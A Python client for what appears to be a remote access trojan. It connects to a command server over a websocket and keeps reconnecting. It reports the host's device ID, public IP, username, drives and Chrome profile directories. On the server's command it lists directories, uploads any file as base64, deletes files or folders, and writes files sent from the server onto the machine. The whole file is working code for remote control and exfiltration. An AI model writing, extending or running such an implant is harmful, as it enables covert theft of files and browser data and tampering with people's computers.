import asyncio
import json

import websockets

from chrome_paths import get_chrome_directory_listings
from filesystem import list_directory, read_file_base64, delete_path, write_file
from ssl_utils import build_ssl_context
from system_info import (
    get_device_id,
    get_drives,
    get_os_type,
    get_public_ip,
    get_username,
)


async def run(url: str) -> None:
    device_id = get_device_id()
    os_type = get_os_type()
    public_ip = get_public_ip()
    username = get_username()

    print(f"Device ID : {device_id}")
    print(f"OS Type   : {os_type}")
    print(f"Public IP : {public_ip}")
    print(f"Username  : {username}")
    print(f"Server    : {url}")
    print()

    ssl_ctx = build_ssl_context(url)

    while True:
        try:
            async with websockets.connect(url, ssl=ssl_ctx) as ws:
                await ws.send(
                    json.dumps(
                        {
                            "type": "client_connect",
                            "data": {
                                "device_id": device_id,
                                "os_type": os_type,
                                "public_ip": public_ip,
                                "username": username,
                            },
                        }
                    )
                )
                print("[connected]")

                async def heartbeat() -> None:
                    while True:
                        await asyncio.sleep(15)
                        await ws.send(json.dumps({"type": "heartbeat"}))

                async def listen() -> None:
                    async for message in ws:
                        data = json.loads(message)
                        print(f"<< {data}")

                        if data.get("type") == "request_info":
                            fresh_info = {
                                "type": "client_info_response",
                                "data": {
                                    "device_id": device_id,
                                    "os_type": get_os_type(),
                                    "public_ip": get_public_ip(),
                                    "username": get_username(),
                                    "request_id": data.get("request_id"),
                                    "drives": get_drives(),
                                    "chrome_directories": get_chrome_directory_listings(),
                                },
                            }
                            await ws.send(json.dumps(fresh_info))
                            print(
                                f">> sent fresh info + {len(fresh_info['data']['drives'])} drives (request {data.get('request_id')})"
                            )

                        elif data.get("type") == "request_directory":
                            req_path = data.get("path", "/")
                            result = list_directory(req_path)
                            response = {
                                "type": "directory_response",
                                "data": {
                                    "request_id": data.get("request_id"),
                                    "path": result["path"],
                                    "entries": result["entries"],
                                    "error": result.get("error"),
                                },
                            }
                            await ws.send(json.dumps(response))
                            err = result.get("error")
                            err_suffix = f" [error: {err}]" if err else ""
                            print(
                                f">> sent directory listing for {req_path}: {len(result['entries'])} entries (request {data.get('request_id')}){err_suffix}"
                            )

                        elif data.get("type") == "request_upload":
                            file_path = data.get("path", "")
                            result = read_file_base64(file_path)
                            response = {
                                "type": "upload_response",
                                "data": {
                                    "request_id": data.get("request_id"),
                                    "path": file_path,
                                    "file_data": result.get("file_data"),
                                    "file_size": result.get("file_size"),
                                    "error": result.get("error"),
                                },
                            }
                            await ws.send(json.dumps(response))
                            if result.get("error"):
                                print(f">> upload failed for {file_path}: {result['error']} (request {data.get('request_id')})")
                            else:
                                print(f">> sent file data for {file_path}: {result['file_size']} bytes (request {data.get('request_id')})")

                        elif data.get("type") == "request_delete":
                            target_path = data.get("path", "")
                            is_dir = data.get("is_dir", False)
                            result = delete_path(target_path, is_dir)
                            response = {
                                "type": "delete_response",
                                "data": {
                                    "request_id": data.get("request_id"),
                                    "path": target_path,
                                    "success": result.get("success", False),
                                    "error": result.get("error"),
                                },
                            }
                            await ws.send(json.dumps(response))
                            if result.get("success"):
                                print(f">> deleted {target_path} (request {data.get('request_id')})")
                            else:
                                print(f">> delete failed for {target_path}: {result.get('error')} (request {data.get('request_id')})")

                        elif data.get("type") == "request_inject":
                            inject_path = data.get("path", "")
                            file_name = data.get("file_name", "")
                            file_data = data.get("file_data", "")
                            result = write_file(inject_path, file_name, file_data)
                            response = {
                                "type": "inject_response",
                                "data": {
                                    "request_id": data.get("request_id"),
                                    "path": inject_path,
                                    "file_name": file_name,
                                    "success": result.get("success", False),
                                    "error": result.get("error"),
                                },
                            }
                            await ws.send(json.dumps(response))
                            if result.get("success"):
                                print(f">> injected {file_name} to {inject_path} (request {data.get('request_id')})")
                            else:
                                print(f">> inject failed for {file_name} at {inject_path}: {result.get('error')} (request {data.get('request_id')})")

                await asyncio.gather(heartbeat(), listen())

        except (ConnectionRefusedError, OSError) as e:
            print(f"[connection failed: {e}] retrying in 5s...")
        except asyncio.CancelledError:
            raise
        except Exception as e:
            print(f"[error: {e}] reconnecting in 5s...")

        await asyncio.sleep(5)
